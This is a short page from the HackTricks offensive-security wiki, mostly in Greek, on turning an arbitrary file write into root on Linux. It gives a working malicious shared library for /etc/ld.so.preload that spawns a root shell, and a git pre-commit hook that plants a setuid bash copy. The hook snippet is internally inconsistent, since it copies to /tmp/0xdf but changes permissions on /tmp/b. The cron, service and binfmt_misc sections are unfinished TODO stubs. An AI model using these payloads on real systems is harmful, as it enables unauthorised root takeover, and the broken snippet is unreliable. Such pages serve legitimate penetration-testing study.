# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Αυτό το αρχείο συμπεριφέρεται όπως η μεταβλητή περιβάλλοντος **`LD_PRELOAD`** αλλά λειτουργεί επίσης σε **SUID binaries**.\
Αν μπορείτε να το δημιουργήσετε ή να το τροποποιήσετε, μπορείτε απλά να προσθέσετε μια **διαδρομή σε μια βιβλιοθήκη που θα φορτωθεί** με κάθε εκτελούμενο δυαδικό αρχείο.

Για παράδειγμα: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) είναι **σενάρια** που εκτελούνται σε διάφορες **εκδηλώσεις** σε ένα αποθετήριο git, όπως όταν δημιουργείται μια δέσμευση, μια συγχώνευση... Έτσι, αν ένα **προνομιακό σενάριο ή χρήστης** εκτελεί αυτές τις ενέργειες συχνά και είναι δυνατό να **γραφεί στον φάκελο `.git`**, αυτό μπορεί να χρησιμοποιηθεί για **privesc**.

Για παράδειγμα, είναι δυνατό να **δημιουργηθεί ένα σενάριο** σε ένα αποθετήριο git στον **`.git/hooks`** ώστε να εκτελείται πάντα όταν δημιουργείται μια νέα δέσμευση:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Το αρχείο που βρίσκεται στο `/proc/sys/fs/binfmt_misc` υποδεικνύει ποιο δυαδικό αρχείο θα εκτελεί ποιο τύπο αρχείων. TODO: ελέγξτε τις απαιτήσεις για να εκμεταλλευτείτε αυτό για να εκτελέσετε ένα rev shell όταν ανοίγει ένας κοινός τύπος αρχείου.

{{#include ../../banners/hacktricks-training.md}}
